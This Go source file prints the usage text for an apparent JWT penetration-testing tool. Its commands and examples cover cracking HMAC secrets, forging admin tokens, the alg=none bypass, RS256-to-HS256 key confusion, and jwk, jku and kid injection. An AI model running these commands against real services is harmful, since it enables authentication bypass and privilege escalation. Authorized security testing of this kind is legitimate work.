package main

import (
	"fmt"
	"os"

	"github.com/MRvirusIR/clavis/internal/ui"
)

func usage() {
	ui.PrintBanner(version)
	fmt.Fprint(os.Stderr, `
USAGE
  clavis <command> [flags]

COMMANDS
  decode      Pretty-print header, payload and timestamps          (alias: d)
  audit       Flag weak algs, alg=none, jwk/jku/kid, missing exp…  (alias: a)
  verify      Check a signature against a secret or public key     (alias: v)
  crack       Brute-force the HS* secret (built-in list/wordlist)  (alias: c)
  forge       Sign a new token with your own claims (HS*/RS*/none) (alias: f, sign)
  alg-none    Forge an unsigned token (alg=none bypass)            (alias: none)
  confuse     RS256→HS256 key-confusion using the public key       (alias: rs2hs)
  jwk-inject  Embed a self-signed public key in the header (jwk)   (alias: jwk)
  jku-inject  Point jku at your JWKS and emit the JWKS to host     (alias: jku)
  kid-inject  Inject a kid (path traversal / SQLi) and sign        (alias: kid)
  scan        Extract JWTs from logs/HAR/JS, optionally audit      (alias: grep)
  version     Print version

TOKEN INPUT
  Every command takes the token via -t <jwt>, a positional argument,
  @file to read from a file, or piped stdin.

EXAMPLES
  # Inspect a token
  clavis decode -t eyJhbGci...
  echo "$JWT" | clavis audit

  # Crack a weak HMAC secret
  clavis crack -t eyJhbGci... -w rockyou.txt

  # Forge an admin token once you know the secret (relative exp)
  clavis forge -t eyJhbGci... -secret s3cr3t -set role=admin -set exp=+24h

  # alg=none bypass (print every casing)
  clavis alg-none -t eyJhbGci... -set role=admin -all

  # RS256 → HS256 confusion with the server's public key
  clavis confuse -t eyJhbGci... -pub public.pem -set role=admin -all

  # jku injection: forge + get the JWKS to host at your URL
  clavis jku-inject -t eyJhbGci... -jku https://you/jwks.json -set role=admin -jwks-out jwks.json

  # kid path-traversal presets
  clavis kid-inject -t eyJhbGci... -presets -set role=admin

  # Hunt tokens in a HAR/log file and audit each one
  clavis scan -f traffic.har -audit

Authorized security testing only. You are responsible for how you use this.
`)
}
